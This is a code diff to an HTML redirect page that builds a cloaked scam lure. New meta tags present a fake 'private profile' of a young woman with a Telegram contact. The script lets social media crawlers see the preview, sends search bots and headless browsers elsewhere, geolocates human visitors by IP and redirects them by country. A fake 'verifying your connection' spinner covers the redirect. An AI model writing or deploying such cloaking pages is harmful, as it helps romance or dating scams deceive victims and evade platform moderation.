@@ -1,8 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Caroline Müller - Private Profile 📸</title>
+    <meta name="title" content="Caroline Müller - Private Profile 📸">
+    <meta name="description" content="29 | 5’8” | Zürich 📍 Ständig in Entwicklung 🌱 - Connect with me!">
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://chatme.com/"> <meta property="og:title" content="Caroline Müller - Private Profile 📸">
+    <meta property="og:description" content="riaß eich☺️🫶🏻 Deutschland 🇩🇪 📍 Berlin. Single 💔. Kontaktiere mich über Telegram!">
+    <meta property="og:image" content="https://cdn.apextrack.site/uploads/img_693994c272a6b2.94045914.jpeg"> <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://chatme.com/">
+    <meta property="twitter:title" content="Caroline Müller - Private Profile 📸">
+    <meta property="twitter:description" content="29 | 5’8” | Zürich 📍 Ständig in Entwicklung 🌱">
+    <meta property="twitter:image" content="https://cdn.apextrack.site/uploads/img_693994c272a6b2.94045914.jpeg">
+
     <script>
         const config = {
             rules: {
@@ -17,33 +34,29 @@
 
         function isBot() {
             const ua = navigator.userAgent.toLowerCase();
-            return /bot|crawler|spider|googlebot|bingbot|facebookexternalhit|slurp|duckduckbot|baiduspider|headless|selenium|puppeteer/i.test(ua) || navigator.webdriver;
+            // List bot/crawler sosmed agar preview muncul (jangan di-redirect paksa dulu)
+            const isSocialBot = /facebookexternalhit|twitterbot|whatsapp|telegrambot|pinterest|linkedinbot/i.test(ua);
+            const isSearchBot = /bot|crawler|spider|googlebot|bingbot|slurp|duckduckbot|baiduspider|headless|selenium|puppeteer/i.test(ua) || navigator.webdriver;
+            
+            return { isSocialBot, isSearchBot };
         }
 
-        // --- SISTEM FALLBACK API ---
         async function getCountry() {
-            // API 1: IPAPI.CO (Mendukung HTTPS)
             try {
-                console.log("Mencoba API 1...");
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 if (data.country) return data.country;
             } catch (e) { console.warn("API 1 Gagal"); }
 
-            // API 2: IP-API.COM (Note: Versi gratis kadang error di HTTPS, gunakan pro/fallback)
             try {
-                console.log("Mencoba API 2...");
-                const res = await fetch('http://demo.ip-api.com/json/'); // Endpoint demo seringkali lebih stabil untuk HTTPS
+                const res = await fetch('https://demo.ip-api.com/json/'); 
                 const data = await res.json();
                 if (data.countryCode) return data.countryCode;
             } catch (e) { console.warn("API 2 Gagal"); }
 
-            // API 3: CLOUDFLARE TRACE (Sangat stabil)
             try {
-                console.log("Mencoba API 3...");
                 const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                 const text = await res.text();
-                // Parsing format teks Cloudflare (loc=XX)
                 const loc = text.match(/loc=([A-Z]{2})/);
                 if (loc && loc[1]) return loc[1];
             } catch (e) { console.warn("API 3 Gagal"); }
@@ -52,7 +65,16 @@
         }
 
         async function start() {
-            if (isBot()) {
+            const botStatus = isBot();
+
+            // Jika crawler sosmed, STOP di sini agar preview gambar terbaca
+            if (botStatus.isSocialBot) {
+                console.log("Social Media Crawler detected. Preview mode.");
+                return;
+            }
+
+            // Jika bot mesin pencari/headless, langsung buang ke defaultUrl
+            if (botStatus.isSearchBot) {
                 window.location.replace(config.defaultUrl);
                 return;
             }
@@ -60,21 +82,28 @@
             const country = await getCountry();
             
             if (country) {
-                console.log("Negara terdeteksi:", country);
                 const target = config.rules[country] || config.defaultUrl;
                 window.location.replace(target);
             } else {
-                // Jika semua API gagal
                 window.location.replace(config.defaultUrl);
             }
         }
 
+        // Jalankan script
         start();
     </script>
 </head>
-<body>
-    <div style="text-align: center; margin-top: 20%; font-family: sans-serif;">
-        <p>Verifying your connection, please wait...</p>
+<body style="background-color: #f0f2f5;">
+    <div style="text-align: center; margin-top: 20%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+        <div class="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto;"></div>
+        <p style="color: #65676b;">Verifying your connection, please wait...</p>
     </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </body>
 </html>
